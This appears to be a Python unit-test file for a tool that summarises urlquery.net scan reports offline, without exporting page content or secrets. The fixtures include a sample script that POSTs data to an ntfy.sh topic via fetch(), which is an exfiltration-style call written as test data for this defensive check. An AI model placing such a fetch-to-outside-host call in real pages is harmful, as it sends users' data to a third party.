"""Offline checks only; no external request or recovered program execution."""

import base64
import io
import json
import unittest
from unittest.mock import patch

from review_backlog import NoRedirect, inspect_report


class BacklogReviewTests(unittest.TestCase):
    def test_rejects_unlisted_route_without_network(self):
        with patch("review_backlog.build_opener") as opener:
            result = inspect_report("https://urlquery.net/report/not-a-report")
        self.assertEqual(result["review_status"], "rejected_non_report_route")
        opener.assert_not_called()

    def test_redirects_are_not_followed(self):
        self.assertIsNone(NoRedirect().redirect_request(None, None, 302, "", {}, "https://example.com/"))

    def test_structure_does_not_export_content_or_sink_path(self):
        source = "<script>fetch('https://ntfy.sh/DO_NOT_EXPORT_TOPIC',{method:'POST',body:'DO_NOT_EXPORT_BODY'});</script>"
        submitted = "https://httpbin.org/base64/" + base64.b64encode(source.encode()).decode()
        data = {
            "date": "2026-10-05T17:05:32Z", "submit": {"url": {"addr": submitted}},
            "http": [{"date": "2026-10-05T17:05:31.123Z",
                      "url": {"fqdn": "ntfy.sh", "addr": "https://ntfy.sh/DO_NOT_EXPORT_TOPIC"},
                      "request": {"method": "POST", "raw": "X-Test: DO_NOT_EXPORT_SECRET\r\n\r\nDO_NOT_EXPORT_BODY"},
                      "response": {"status_code": 200, "data": {
                          "size": 0,
                          "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                          "data": "DO_NOT_EXPORT_RESPONSE",
                      }}}],
        }
        with patch("review_backlog.build_opener") as opener:
            opener.return_value.open.return_value = io.BytesIO(json.dumps(data).encode())
            result = inspect_report("https://urlquery.net/report/1796063a-2e68-48a8-866f-240ecd4570b9")
        published = json.dumps(result)
        self.assertNotIn("DO_NOT_EXPORT", published)
        self.assertNotIn("base64/", published)
        self.assertNotIn("page_title", result)
        self.assertEqual(result["static_operation_counts"]["fetch_calls"], 1)
        self.assertEqual(result["static_operation_counts"]["explicit_post_methods"], 1)
        self.assertEqual(result["recorded_network_summary"][0]["host"], "ntfy.sh")
        self.assertEqual(len(result["recorded_channel_references"][0]["channel_ref_sha256"]), 64)
        self.assertEqual(result["recorded_channel_references"][0]["recorded_at"], "2026-10-05T17:05:31.123Z")
        self.assertEqual(result["recorded_channel_references"][0]["recorded_request_body_characters"], 18)
        self.assertEqual(result["recorded_channel_references"][0]["recorded_response_body_bytes"], 0)
        self.assertEqual(
            result["recorded_channel_references"][0]["recorded_response_body_sha256"],
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        )
        opener.return_value.open.assert_called_once()
        self.assertTrue(opener.return_value.open.call_args.args[0].full_url.endswith("/json"))

    def test_extracts_protocol_relative_and_encoded_domains_only(self):
        source = "<iframe src='//example.com/DO_NOT_EXPORT_PATH'></iframe><a href='https%3A%2F%2Fexample.net%2FDO_NOT_EXPORT_PATH'>x</a><script>//g</script>"
        submitted = "https://httpbin.org/base64/" + base64.b64encode(source.encode()).decode()
        data = {"submit": {"url": {"addr": submitted}}}
        with patch("review_backlog.build_opener") as opener:
            opener.return_value.open.return_value = io.BytesIO(json.dumps(data).encode())
            result = inspect_report("https://urlquery.net/report/1796063a-2e68-48a8-866f-240ecd4570b9")
        self.assertEqual(result["expanded_domain_references"], ["example.com", "example.net"])
        self.assertNotIn("DO_NOT_EXPORT", json.dumps(result))


if __name__ == "__main__":
    unittest.main()
